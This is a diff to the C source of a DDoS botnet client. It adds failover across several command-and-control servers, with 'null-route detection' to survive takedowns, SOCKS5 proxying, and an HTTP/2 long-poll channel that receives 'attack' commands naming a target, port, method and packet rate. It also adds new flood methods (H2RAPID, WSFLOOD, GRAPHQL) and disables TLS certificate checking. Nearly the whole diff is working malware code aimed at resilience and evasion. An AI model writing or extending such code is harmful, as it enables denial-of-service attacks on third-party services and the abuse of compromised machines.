@@ -10,7 +10,7 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.50"
+#define BOT_VERSION_TAG "v4.0.56"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
 
@@ -176,6 +176,56 @@ int main(int argc, char *argv[])
     cfg.stale_timeout = 120;
     cfg.default_pps = 100000;
     cfg.default_threads = 100;
+    cfg.socks5_proxy[0] = 0;
+    cfg.c2_count = 0;
+    cfg.c2_current = 0;
+    cfg.c2_fail_count = 0;
+    cfg.protocol = 0; /* default: websocket */
+    {
+        const char *proto = getenv("BOT_PROTOCOL");
+        if (proto && (proto[0] == '1' || !strcmp(proto, "poll") || !strcmp(proto, "h2")))
+            cfg.protocol = 1; /* HTTP/2 long-poll mode */
+    }
+    {
+        const char *sp = getenv("BOT_SOCKS5");
+        if (sp && *sp) {
+            strncpy(cfg.socks5_proxy, sp, sizeof(cfg.socks5_proxy) - 1);
+            cfg.socks5_proxy[sizeof(cfg.socks5_proxy) - 1] = 0;
+        }
+    }
+
+    /* Multi-C2: parse BOT_C2_LIST (comma-separated URLs) or file */
+    {
+        const char *c2env = getenv("BOT_C2_LIST");
+        if (c2env && *c2env) {
+            char buf[4096];
+            strncpy(buf, c2env, sizeof(buf) - 1);
+            buf[sizeof(buf) - 1] = 0;
+            char *tok = strtok(buf, ",");
+            while (tok && cfg.c2_count < 8) {
+                while (*tok == ' ') tok++;
+                strncpy(cfg.c2_list[cfg.c2_count], tok, 511);
+                cfg.c2_list[cfg.c2_count][511] = 0;
+                cfg.c2_count++;
+                tok = strtok(NULL, ",");
+            }
+        }
+        /* Also try file: /etc/bot_c2_list.txt or bot_c2_list.txt */
+        if (cfg.c2_count == 0) {
+            FILE *cf = fopen("/etc/bot_c2_list.txt", "r");
+            if (!cf) cf = fopen("bot_c2_list.txt", "r");
+            if (cf) {
+                char line[512];
+                while (cfg.c2_count < 8 && fgets(line, sizeof(line), cf)) {
+                    /* strip whitespace */
+                    char *s = line; while (*s == ' ' || *s == '\t') s++;
+                    char *e = s + strlen(s); while (e > s && (e[-1] == '\n' || e[-1] == '\r' || e[-1] == ' ')) *--e = 0;
+                    if (*s) { strncpy(cfg.c2_list[cfg.c2_count], s, 511); cfg.c2_list[cfg.c2_count][511] = 0; cfg.c2_count++; }
+                }
+                fclose(cf);
+            }
+        }
+    }
 
     SysInfo info = {0};
     sys_info(&info);
@@ -193,32 +243,194 @@ int main(int argc, char *argv[])
     gen_payloads();
 
     if (foreground) {
-        fprintf(stderr, "[bot] version %s uuid=%s c2=%s:%d%s ssl=%d\n",
-                BOT_VERSION_TAG, g_bot_uuid, cfg.c2_host, cfg.c2_port, cfg.c2_path, cfg.use_ssl);
+        fprintf(stderr, "[bot] version %s uuid=%s c2=%s:%d%s ssl=%d proto=%d c2_list=%d\n",
+                BOT_VERSION_TAG, g_bot_uuid, cfg.c2_host, cfg.c2_port, cfg.c2_path, cfg.use_ssl, cfg.protocol, cfg.c2_count);
     }
 
+    /* HTTP/2 long-poll mode — alternative to WebSocket (no 100s timeout, proxy-friendly) */
+    if (cfg.protocol == 1) {
+        if (foreground) fprintf(stderr, "[bot] HTTP/2 long-poll mode\n");
+        while (!g_shutdown) {
+            /* Multi-C2 switch logic */
+            if (cfg.c2_count > 1 && cfg.c2_fail_count >= 3) {
+                cfg.c2_current = (cfg.c2_current + 1) % cfg.c2_count;
+                cfg.c2_fail_count = 0;
+                const char *url = cfg.c2_list[cfg.c2_current];
+                if (strncmp(url, "wss://", 6) == 0) { cfg.use_ssl = 1; url += 6; }
+                else if (strncmp(url, "ws://", 5) == 0) { cfg.use_ssl = 0; cfg.c2_port = 80; url += 5; }
+                else if (strncmp(url, "https://", 8) == 0) { cfg.use_ssl = 1; url += 8; }
+                else if (strncmp(url, "http://", 7) == 0) { cfg.use_ssl = 0; cfg.c2_port = 80; url += 7; }
+                const char *colon = strchr(url, ':');
+                const char *slash = strchr(url, '/');
+                if (colon && (!slash || colon < slash)) {
+                    int hlen = (int)(colon - url);
+                    if (hlen >= (int)sizeof(cfg.c2_host)) hlen = (int)sizeof(cfg.c2_host) - 1;
+                    memcpy(cfg.c2_host, url, (size_t)hlen); cfg.c2_host[hlen] = 0;
+                    cfg.c2_port = atoi(colon + 1);
+                } else {
+                    int hlen = slash ? (int)(slash - url) : (int)strlen(url);
+                    if (hlen >= (int)sizeof(cfg.c2_host)) hlen = (int)sizeof(cfg.c2_host) - 1;
+                    memcpy(cfg.c2_host, url, (size_t)hlen); cfg.c2_host[hlen] = 0;
+                    cfg.c2_port = cfg.use_ssl ? 443 : 80;
+                }
+                if (foreground) fprintf(stderr, "[bot] C2 switch → #%d %s:%d\n", cfg.c2_current, cfg.c2_host, cfg.c2_port);
+            }
+
+            /* Connect via TLS to C2 */
+            struct addrinfo hints = {0}, *res = NULL;
+            hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
+            char ps[8]; snprintf(ps, sizeof(ps), "%d", cfg.c2_port);
+            if (getaddrinfo(cfg.c2_host, ps, &hints, &res) != 0) {
+                cfg.c2_fail_count++; sleep(cfg.reconnect_min); continue;
+            }
+            int s = socket(AF_INET, SOCK_STREAM, 0);
+            if (s < 0) { freeaddrinfo(res); sleep(cfg.reconnect_min); continue; }
+            int fl = 1; setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
+            struct timeval tv = {30, 0};
+            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+            if (connect(s, res->ai_addr, res->ai_addrlen) < 0) {
+                close(s); freeaddrinfo(res); cfg.c2_fail_count++; sleep(cfg.reconnect_min); continue;
+            }
+            freeaddrinfo(res);
+
+            SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
+            SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
+            SSL *ssl = SSL_new(ctx);
+            SSL_set_fd(ssl, s);
+            SSL_set_tlsext_host_name(ssl, cfg.c2_host);
+            if (SSL_connect(ssl) != 1) {
+                SSL_free(ssl); SSL_CTX_free(ctx); close(s);
+                cfg.c2_fail_count++; sleep(cfg.reconnect_min); continue;
+            }
+            cfg.c2_fail_count = 0;
+            if (foreground) fprintf(stderr, "[bot] HTTP/2 poll connected\n");
+
+            /* Long-poll loop: POST /api/bot/poll with bot_id, receive commands */
+            time_t last_hb = time(NULL);
+            while (!g_shutdown) {
+                time_t now = time(NULL);
+                /* Send heartbeat POST */
+                if (now - last_hb >= cfg.heartbeat_int) {
+                    char body[512];
+                    int blen = snprintf(body, sizeof(body),
+                        "{\"bot_id\":\"%s\",\"cpu_usage\":%d,\"packets_sent\":%llu,\"bytes_sent\":%llu}",
+                        g_bot_uuid, get_cpu_usage(), g_pkt_count, g_byte_count);
+                    char req[1024];
+                    int rlen = snprintf(req, sizeof(req),
+                        "POST %spoll HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\n"
+                        "Content-Length: %d\r\nConnection: keep-alive\r\n\r\n%s",
+                        cfg.c2_path, cfg.c2_host, blen, body);
+                    SSL_write(ssl, req, rlen);
+                    last_hb = now;
+                    /* Read response (commands from server) */
+                    char rbuf[8192];
+                    int n = SSL_read(ssl, rbuf, sizeof(rbuf) - 1);
+                    if (n > 0) {
+                        rbuf[n] = 0;
+                        /* Parse HTTP body for JSON command */
+                        char *body_start = strstr(rbuf, "\r\n\r\n");
+                        if (body_start) {
+                            body_start += 4;
+                            /* Process command (same handler as WS) */
+                            char type[64] = {0};
+                            json_str(body_start, "type", type, sizeof(type));
+                            if (type[0]) {
+                                if (foreground) fprintf(stderr, "[bot] poll recv type=%s\n", type);
+                                if (!strcmp(type, "attack")) {
+                                    /* Parse attack — same as WS handler */
+                                    AttackParams atk = {0};
+                                    json_str(body_start, "target", atk.target, sizeof(atk.target));
+                                    atk.port = (int)json_int(body_start, "port");
+                                    json_str(body_start, "method", atk.method, sizeof(atk.method));
+                                    atk.duration_secs = (int)json_int(body_start, "duration");
+                                    atk.max_pps = (unsigned)json_int(body_start, "pps");
+                                    json_str(body_start, "payload", atk.payload_b64, sizeof(atk.payload_b64));
+                                    json_str(body_start, "proxies", atk.proxies, sizeof(atk.proxies));
+                                    if (atk.target[0] && atk.method[0]) {
+                                        BgAttackCtx *actx = malloc(sizeof(BgAttackCtx));
+                                        if (actx) { memcpy(&actx->atk, &atk, sizeof(AttackParams)); actx->cfg = &cfg; pthread_t t; pthread_create(&t, NULL, bg_attack_thread, actx); pthread_detach(t); }
+                                    }
+                                } else if (!strcmp(type, "stop")) {
+                                    request_attack_stop();
+                                } else if (!strcmp(type, "ban")) {
+                                    g_shutdown = 1; break;
+                                }
+                            }
+                        }
+                    } else if (n < 0) {
+                        break; /* connection lost */
+                    }
+                }
+                usleep(100000); /* 100ms poll interval */
+            }
+            SSL_free(ssl); SSL_CTX_free(ctx); close(s);
+            if (!g_shutdown) sleep(cfg.reconnect_min);
+        }
+        return 0;
+    }
+
+    /* WebSocket mode (default) */
     while (!g_shutdown)
     {
+        /* Multi-C2: if current C2 has failed 3+ times, switch to next */
+        if (cfg.c2_count > 1 && cfg.c2_fail_count >= 3) {
+            cfg.c2_current = (cfg.c2_current + 1) % cfg.c2_count;
+            cfg.c2_fail_count = 0;
+            /* Parse new C2 URL into cfg */
+            const char *url = cfg.c2_list[cfg.c2_current];
+            if (strncmp(url, "wss://", 6) == 0) { cfg.use_ssl = 1; url += 6; }
+            else if (strncmp(url, "ws://", 5) == 0) { cfg.use_ssl = 0; cfg.c2_port = 80; url += 5; }
+            const char *colon = strchr(url, ':');
+            const char *slash = strchr(url, '/');
+            if (colon && (!slash || colon < slash)) {
+                int hlen = (int)(colon - url);
+                if (hlen >= (int)sizeof(cfg.c2_host)) hlen = (int)sizeof(cfg.c2_host) - 1;
+                memcpy(cfg.c2_host, url, (size_t)hlen); cfg.c2_host[hlen] = 0;
+                cfg.c2_port = atoi(colon + 1);
+            } else {
+                int hlen = slash ? (int)(slash - url) : (int)strlen(url);
+                if (hlen >= (int)sizeof(cfg.c2_host)) hlen = (int)sizeof(cfg.c2_host) - 1;
+                memcpy(cfg.c2_host, url, (size_t)hlen); cfg.c2_host[hlen] = 0;
+                cfg.c2_port = cfg.use_ssl ? 443 : 80;
+            }
+            if (slash && slash[1]) {
+                int plen = (int)strlen(slash);
+                if (plen < (int)sizeof(cfg.c2_path)) { memcpy(cfg.c2_path, slash, (size_t)plen); cfg.c2_path[plen] = 0; }
+                else { memcpy(cfg.c2_path, slash, sizeof(cfg.c2_path) - 1); cfg.c2_path[sizeof(cfg.c2_path) - 1] = 0; }
+            }
+            if (foreground) fprintf(stderr, "[bot] C2 switch → #%d %s:%d%s\n", cfg.c2_current, cfg.c2_host, cfg.c2_port, cfg.c2_path);
+        }
+
         WS ws = {0};
         ws.sockfd = -1;
         strcpy(ws.host, cfg.c2_host);
         ws.port = cfg.c2_port;
         strcpy(ws.path, cfg.c2_path);
         ws.use_ssl = cfg.use_ssl;
+        strcpy(ws.socks5, cfg.socks5_proxy);
         pthread_mutex_init(&ws.io, NULL);
 
         if (ws_connect(&ws, g_bot_uuid) != 0)
         {
-            if (foreground) fprintf(stderr, "[bot] connect failed, retry...\n");
+            cfg.c2_fail_count++;
+            /* BGP null-route detection: 5 consecutive failures = likely null-routed */
+            if (cfg.c2_fail_count >= 5 && cfg.c2_count > 1) {
+                if (foreground) fprintf(stderr, "[bot] BGP null-route suspected on C2 #%d, switching\n", cfg.c2_current);
+                /* Force switch on next loop iteration */
+                cfg.c2_fail_count = 3;
+            }
+            if (foreground) fprintf(stderr, "[bot] connect failed #%d (c2 #%d)\n", cfg.c2_fail_count, cfg.c2_current);
             int bo = cfg.reconnect_min;
             while (!g_shutdown) {
                 sleep(bo);
                 bo = bo * 2 < cfg.reconnect_max ? bo * 2 : cfg.reconnect_max;
                 if (ws_connect(&ws, g_bot_uuid) == 0) break;
             }
-            if (g_shutdown) { pthread_mutex_destroy(&ws.io); break; }
+        if (g_shutdown) { pthread_mutex_destroy(&ws.io); break; }
         }
-        if (foreground) fprintf(stderr, "[bot] WS connected\n");
+        cfg.c2_fail_count = 0; /* reset on successful connect */
+        if (foreground) fprintf(stderr, "[bot] WS connected (c2 #%d)\n", cfg.c2_current);
 
         char esc_ip[128], esc_os[256], esc_hwid[64];
         json_escape(info.ip_addr, esc_ip, sizeof(esc_ip));
@@ -428,7 +640,8 @@ int main(int argc, char *argv[])
                     if (strcmp(m, "UDP") && strcmp(m, "MEGA") &&
                         strcmp(m, "HTTP") && strcmp(m, "SLOWLORIS") &&
                         strcmp(m, "TLS_EXHAUST") && strcmp(m, "HTTP_PROXY") &&
-                        strcmp(m, "GAME")) {
+                        strcmp(m, "GAME") && strcmp(m, "H2RAPID") &&
+                        strcmp(m, "WSFLOOD") && strcmp(m, "GRAPHQL")) {
                         if (foreground)
                             fprintf(stderr, "[bot] ignore unknown method '%s'\n", m);
                         continue;
